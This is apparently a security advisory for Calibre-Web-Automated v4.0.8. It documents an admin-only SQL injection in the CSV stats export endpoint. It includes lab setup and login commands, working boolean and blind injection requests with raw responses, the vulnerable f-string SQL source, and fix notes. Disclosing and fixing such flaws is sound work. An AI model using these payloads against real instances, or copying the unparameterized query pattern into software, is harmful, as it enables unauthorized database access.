### Vulnerability details

**Official website / Product:** https://github.com/crocodilestick/Calibre-Web-Automated

**Repository:** crocodilestick/Calibre-Web-Automated (stars at selection: 6534)

**Vulnerability type:** SQLi

**Vulnerability versions:** Calibre-Web-Automated v4.0.8 (Docker image `crocodilestick/calibre-web-automated:v4.0.8`, commit `3ce7bf80c8c66485eec7218c6b6c3fef8e6e6ba5`)

**Vulnerability URL / Parameter:** `GET /cwa-stats-export-csv/<tab_name>` query parameters `start_date` / `end_date` (admin session required; `@admin_required`)

**Complex:** yes

### Verification procedure

1. Bring up the lab (original `labs/cwa-r33-a2/docker-compose.yml` is no longer in-tree; use the equivalent below):

```bash
docker run -d --name cwa-r33-a2 \
  -e PUID=1000 -e PGID=1000 -e TZ=UTC \
  -p 21302:8083 \
  crocodilestick/calibre-web-automated:v4.0.8
# wait until healthy; UI: http://127.0.0.1:21302/
# expected container status example:
# NAME         IMAGE                                         STATUS                   PORTS
# cwa-r33-a2   crocodilestick/calibre-web-automated:v4.0.8   Up … (healthy)           0.0.0.0:21302->8083/tcp
# image id: 43505abb1b0e (~1.72GB)
```

Lab topology: host port **21302 → 8083**; default admin credentials **`admin` / `admin123`**; audit tag **v4.0.8** / commit `3ce7bf80c8c66485eec7218c6b6c3fef8e6e6ba5`. Complete first-run wizard as needed.

2. Obtain an admin `session` cookie (the Cookie values in the PoC below are lab-captured and **must not be replayed**; log in fresh):

```bash
# GET /login for csrf_token + initial session
curl -s -c /tmp/cwa.ck -b /tmp/cwa.ck 'http://127.0.0.1:21302/login' -o /tmp/cwa-login.html
CSRF=$(sed -n 's/.*name="csrf_token" value="\([^"]*\)".*/\1/p' /tmp/cwa-login.html | head -1)
# POST /login (form fields username / password / csrf_token)
curl -s -c /tmp/cwa.ck -b /tmp/cwa.ck -X POST 'http://127.0.0.1:21302/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "username=admin" \
  --data-urlencode "password=admin123" \
  --data-urlencode "csrf_token=$CSRF" \
  -o /dev/null -D -
# take session=... from /tmp/cwa.ck for subsequent requests
```

3. Call the CSV export endpoint with a future empty window: `start_date=2099-12-31` and `end_date=2099-12-31') OR 1=1--` (URL-encoded in the full request below).
4. Observe CSV `total_events` > 0 (boolean-true bypass of the date window). Lab measurement was `total_events,6` (exact count depends on prior activity on the instance; contrast with boolean-false).
5. Change `end_date` to `2099-12-31') AND 1=0--` and observe `total_events,0`.
6. Blind check: `end_date=2099-12-31') OR (SELECT COUNT(*) FROM sqlite_master WHERE name='cwa_settings')>0--` yields events > 0; replace the table name with non-existent `no_such_table_xyz` to get 0.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified boolean-true):

```http
GET /cwa-stats-export-csv/activity?start_date=2099-12-31&end_date=2099-12-31%27%29%20OR%201%3D1-- HTTP/1.1
Host: 127.0.0.1:21302
User-Agent: CWA-SQLi-PoC/1.0
Accept: text/csv,*/*
Cookie: session=.eJwljs2KAjEQhF8l5OLFw-Svk543kUWkk-5WWZ2BicMexHffLHsqvqIovre96IP6Tbqdv97WvEbYvrcmvdujPa27oU3Msv6Yx3q9Cpv7YqjP5kD8vC8He_6cj-Njk36z82vbZdCd7WwxOAfoawDCWrB68LmoFherSMveZfWOErTkeRIAnXKIyUusCIlwquqVCSCpQhLwENSxawlRkahWLiGO18akMVRJkDO5gtEJhDpxGfaXjRZen0MmtSKtYOOJcmZlFMa_wd5l-9d1A1vf9PJav2UZRW5VskieGqSKSkjDXBlqqc3FoMGT50hkP78gzGCj.aufm4w.qXE_GFH-RLa2wKbNzq3RXbWiElg
Connection: close

```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Content-Type: text/csv; charset=utf-8
Content-Length: 446
Content-Disposition: attachment; filename="cwa_stats_activity_20261102_012735.csv"
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' data:; img-src 'self' data:; object-src 'none';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Vary: Cookie
Set-Cookie: session=.eJyVkE1qxDAMha8SvJlNKP6V7dyklCHItjQTOklKnNDFkLvXbU8wG4knPj0e7ylGfmC9UxXDx1N0e1uiHjlTraIX7-vR4Ubdsn53j_V2o9JNS4d16C5Y5mm5iOt57ZvHRvUuhn07qKmpiEFEoxREnQxgTCEmDdoH5qBsIspeK89aoYPsdJEEwNIb6zTZFMFhlIk1FwRwzOAINBhWRWUXI0fElEowtrnmgmxNIgfeowrRKgKTZAkt_bjhUta5hXE5UA4xF4neFy6RSvwFjkrbf1zVZK4bj_v6SUs7-JzIE3mZwaXIGLEl5wIppKysYaNRF4vY_ma8TXlsJT54zOux7K3MZ3Ns40-KQfZin2aqO85fYlA-Ghd0cO7NSu1NgLMX-jXcvIbb13D3Cn6eP43kqc0.aufnBw.n5XHYlp6YBAqFqeSIGp57C3M7us; HttpOnly; Path=/; SameSite=Lax
Date: Mon, 02 Nov 2026 01:27:35 GMT

=== USER ACTIVITY STATISTICS ===

Metric,Value
total_events,6
total_logins,6
unique_downloads,0
unique_reads,0
active_users,1
total_downloads,0
total_reads,0
total_searches,0

=== TOP USERS ===
User ID,Username,Event Count
1,Unknown,3
1,admin,3

=== FORMAT DISTRIBUTION ===
Format,Download Count
UNKNOWN,6

=== DISCOVERY SOURCES ===
Source,Access Count
direct,6

=== DEVICE BREAKDOWN ===
Device,Access Count
desktop,6
```

Boolean-false contrast request:

```http
GET /cwa-stats-export-csv/activity?start_date=2099-12-31&end_date=2099-12-31%27%29%20AND%201%3D0-- HTTP/1.1
Host: 127.0.0.1:21302
User-Agent: CWA-SQLi-PoC/1.0
Accept: text/csv,*/*
Cookie: session=.eJyVkE1qxDAMha8SvJlNKP6V7dyklCHItjQTOklKnNDFkLvXbU8wG4knPj0e7ylGfmC9UxXDx1N0e1uiHjlTraIX7-vR4Ubdsn53j_V2o9JNS4d16C5Y5mm5iOt57ZvHRvUuhn07qKmpiEFEoxREnQxgTCEmDdoH5qBsIspeK89aoYPsdJEEwNIb6zTZFMFhlIk1FwRwzOAINBhWRWUXI0fElEowtrnmgmxNIgfeowrRKgKTZAkt_bjhUta5hXE5UA4xF4neFy6RSvwFjkrbf1zVZK4bj_v6SUs7-JzIE3mZwaXIGLEl5wIppKysYaNRF4vY_ma8TXlsJT54zOux7K3MZ3Ns40-KQfZin2aqO85fYlA-Ghd0cO7NSu1NgLMX-jXcvIbb13D3Cn6eP43kqc0.aufnBw.n5XHYlp6YBAqFqeSIGp57C3M7us
Connection: close

```

Boolean-false contrast response:

```http
HTTP/1.1 200 OK
Content-Type: text/csv; charset=utf-8
Content-Length: 390
Content-Disposition: attachment; filename="cwa_stats_activity_20261102_012735.csv"
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' data:; img-src 'self' data:; object-src 'none';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Vary: Cookie
Date: Mon, 02 Nov 2026 01:27:35 GMT

=== USER ACTIVITY STATISTICS ===

Metric,Value
total_events,0
total_logins,0
unique_downloads,0
unique_reads,0
active_users,0
total_downloads,0
total_reads,0
total_searches,0

=== TOP USERS ===
User ID,Username,Event Count

=== FORMAT DISTRIBUTION ===
Format,Download Count

=== DISCOVERY SOURCES ===
Source,Access Count

=== DEVICE BREAKDOWN ===
Device,Access Count
```

Blind-true (table `cwa_settings` exists):

```http
GET /cwa-stats-export-csv/activity?start_date=2099-12-31&end_date=2099-12-31%27%29%20OR%20%28SELECT%20COUNT%28%2A%29%20FROM%20sqlite_master%20WHERE%20name%3D%27cwa_settings%27%29%3E0-- HTTP/1.1
Host: 127.0.0.1:21302
User-Agent: CWA-SQLi-PoC/1.0
Accept: text/csv,*/*
Cookie: session=.eJyVkE1qxDAMha8SvJlNKP6V7dyklCHItjQTOklKnNDFkLvXbU8wG4knPj0e7ylGfmC9UxXDx1N0e1uiHjlTraIX7-vR4Ubdsn53j_V2o9JNS4d16C5Y5mm5iOt57ZvHRvUuhn07qKmpiEFEoxREnQxgTCEmDdoH5qBsIspeK89aoYPsdJEEwNIb6zTZFMFhlIk1FwRwzOAINBhWRWUXI0fElEowtrnmgmxNIgfeowrRKgKTZAkt_bjhUta5hXE5UA4xF4neFy6RSvwFjkrbf1zVZK4bj_v6SUs7-JzIE3mZwaXIGLEl5wIppKysYaNRF4vY_ma8TXlsJT54zOux7K3MZ3Ns40-KQfZin2aqO85fYlA-Ghd0cO7NSu1NgLMX-jXcvIbb13D3Cn6eP43kqc0.aufnBw.n5XHYlp6YBAqFqeSIGp57C3M7us
Connection: close

```

```http
HTTP/1.1 200 OK
Content-Type: text/csv; charset=utf-8
Content-Length: 446
Content-Disposition: attachment; filename="cwa_stats_activity_20261102_012735.csv"
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' data:; img-src 'self' data:; object-src 'none';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Vary: Cookie
Date: Mon, 02 Nov 2026 01:27:35 GMT

=== USER ACTIVITY STATISTICS ===

Metric,Value
total_events,6
total_logins,6
unique_downloads,0
unique_reads,0
active_users,1
total_downloads,0
total_reads,0
total_searches,0

=== TOP USERS ===
User ID,Username,Event Count
1,Unknown,3
1,admin,3

=== FORMAT DISTRIBUTION ===
Format,Download Count
UNKNOWN,6

=== DISCOVERY SOURCES ===
Source,Access Count
direct,6

=== DEVICE BREAKDOWN ===
Device,Access Count
desktop,6
```

Blind-false (missing table):

```http
GET /cwa-stats-export-csv/activity?start_date=2099-12-31&end_date=2099-12-31%27%29%20OR%20%28SELECT%20COUNT%28%2A%29%20FROM%20sqlite_master%20WHERE%20name%3D%27no_such_table_xyz%27%29%3E0-- HTTP/1.1
Host: 127.0.0.1:21302
User-Agent: CWA-SQLi-PoC/1.0
Accept: text/csv,*/*
Cookie: session=.eJyVkE1qxDAMha8SvJlNKP6V7dyklCHItjQTOklKnNDFkLvXbU8wG4knPj0e7ylGfmC9UxXDx1N0e1uiHjlTraIX7-vR4Ubdsn53j_V2o9JNS4d16C5Y5mm5iOt57ZvHRvUuhn07qKmpiEFEoxREnQxgTCEmDdoH5qBsIspeK89aoYPsdJEEwNIb6zTZFMFhlIk1FwRwzOAINBhWRWUXI0fElEowtrnmgmxNIgfeowrRKgKTZAkt_bjhUta5hXE5UA4xF4neFy6RSvwFjkrbf1zVZK4bj_v6SUs7-JzIE3mZwaXIGLEl5wIppKysYaNRF4vY_ma8TXlsJT54zOux7K3MZ3Ns40-KQfZin2aqO85fYlA-Ghd0cO7NSu1NgLMX-jXcvIbb13D3Cn6eP43kqc0.aufnBw.n5XHYlp6YBAqFqeSIGp57C3M7us
Connection: close

```

```http
HTTP/1.1 200 OK
Content-Type: text/csv; charset=utf-8
Content-Length: 390
Content-Disposition: attachment; filename="cwa_stats_activity_20261102_012735.csv"
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' data:; img-src 'self' data:; object-src 'none';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Vary: Cookie
Date: Mon, 02 Nov 2026 01:27:35 GMT

=== USER ACTIVITY STATISTICS ===

Metric,Value
total_events,0
total_logins,0
unique_downloads,0
unique_reads,0
active_users,0
total_downloads,0
total_reads,0
total_searches,0

=== TOP USERS ===
User ID,Username,Event Count

=== FORMAT DISTRIBUTION ===
Format,Download Count

=== DISCOVERY SOURCES ===
Source,Access Count

=== DEVICE BREAKDOWN ===
Device,Access Count
```

Verification result notes:

With a future date range that should return no activity, the `OR 1=1` payload makes the CSV report `total_events,6` (and related counters); `AND 1=0` returns all zeros. Blind boolean via `sqlite_master` confirms presence of table `cwa_settings` and absence of `no_such_table_xyz`. The HTML stats page `/cwa-stats-show` validates dates with `strptime('%Y-%m-%d')`; the CSV export path does not.

Without a valid admin session the same URL returns `302` to `/login`. Observed response headers:

```http
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 425
Location: /login?next=%2Fcwa-stats-export-csv%2Factivity%3Fstart_date%3D2099-12-31%26end_date%3D2099-12-31%27%29%2BOR%2B1%253D1--
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' data:; img-src 'self' data:; object-src 'none';
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Vary: Cookie
Date: Mon, 02 Nov 2026 01:26:42 GMT
```

Lab summary contrast (boolean-true / boolean-false / blind-true / blind-false):

```
CWA v4.0.8 SQLi boolean + blind proof

TRUE end_date=2099-12-31') OR 1=1--
Metric,Value
total_events,6
…

FALSE end_date=2099-12-31') AND 1=0--
Metric,Value
total_events,0
…

BLIND EXISTS cwa_settings
Metric,Value
total_events,6
…

BLIND MISSING no_such_table_xyz
Metric,Value
total_events,0
…
```

(Full CSV bodies are in the response fences above; the critical contrast is non-zero vs zero `total_events`.)

### Vulnerability analysis

`export_stats_csv` in `cps/cwa_functions.py` reads `start_date`/`end_date` and forwards them into `CWA_DB.get_dashboard_stats` and related helpers **without** the `strptime` validation used by the HTML stats page. Those helpers build filters with f-strings:

`timestamp BETWEEN date('{start_date}') AND date('{end_date}', '+1 day')`

Closing the `date()` string literal lets an attacker rewrite the WHERE clause (boolean / blind). The same pattern is repeated across many queries in `scripts/cwa_db.py`. Endpoint is `@admin_required`.

Trigger / sink source (full path and line numbers; v4.0.8 / `3ce7bf80`):

```python
# File: cps/cwa_functions.py
# Lines: 1318-1354
@cwa_stats.route("/cwa-stats-export-csv/<tab_name>", methods=["GET"])
@login_required_if_no_ano
@admin_required
def export_stats_csv(tab_name):
    """Export stats data as CSV for the specified tab."""
    import csv
    from io import StringIO
    from flask import make_response
    from datetime import datetime

    # Parse same filter parameters as main stats route
    start_date = request.args.get('start_date')
    end_date = request.args.get('end_date')
    days_param = request.args.get('days')
    user_id = request.args.get('user_id', type=int)

    # Handle 'all' as special value
    if days_param == 'all':
        days = None
    else:
        days = int(days_param) if days_param else 30

    cwa_db = CWA_DB()
    output = StringIO()
    writer = csv.writer(output)

    try:
        if tab_name == 'activity':
            writer.writerow(['=== USER ACTIVITY STATISTICS ==='])
            writer.writerow([])

            # Dashboard stats — no strptime allow-list validation
            if start_date and end_date:
                dashboard_stats = cwa_db.get_dashboard_stats(start_date=start_date, end_date=end_date, user_id=user_id)
            else:
                dashboard_stats = cwa_db.get_dashboard_stats(days=days, user_id=user_id)
```

```python
# File: scripts/cwa_db.py
# Lines: 2224-2252 (get_dashboard_stats)
def get_dashboard_stats(self, days=None, start_date=None, end_date=None, user_id=None):
    """Returns comprehensive activity stats for the user dashboard."""
    try:
        # Use date range if provided, otherwise fall back to days
        if start_date and end_date:
            date_filter = f"timestamp BETWEEN date('{start_date}') AND date('{end_date}', '+1 day')"
        else:
            days = days or 30  # Default to 30 days
            date_filter = f"timestamp >= date('now', '-{days} days')"

        # Add user filter if provided
        user_filter = self._build_user_filter(user_id)
        combined_filter = date_filter + user_filter

        # 1. Activity timeline - Daily counts by event type
        self.cur.execute(f"""
            SELECT date(timestamp) as day, event_type, COUNT(*) as count
            FROM cwa_user_activity
            WHERE {combined_filter}
            GROUP BY day, event_type
            ORDER BY day ASC
        """)
```

Contrast: `cps/cwa_functions.py` around lines 1097-1114 (`cwa_stats_show`, function starts at 1067) use `datetime.strptime(..., '%Y-%m-%d')` and clear invalid dates.

### Fix notes

1. Reuse the same `strptime('%Y-%m-%d')` allow-list validation from `cwa_stats_show` on the CSV export (and every other caller of these date filters).
2. Parameterize `date_filter` with `?` placeholders; never interpolate user input into SQL strings.
3. Keep numeric coercion for `days`; audit all f-string SQL in `scripts/cwa_db.py`.
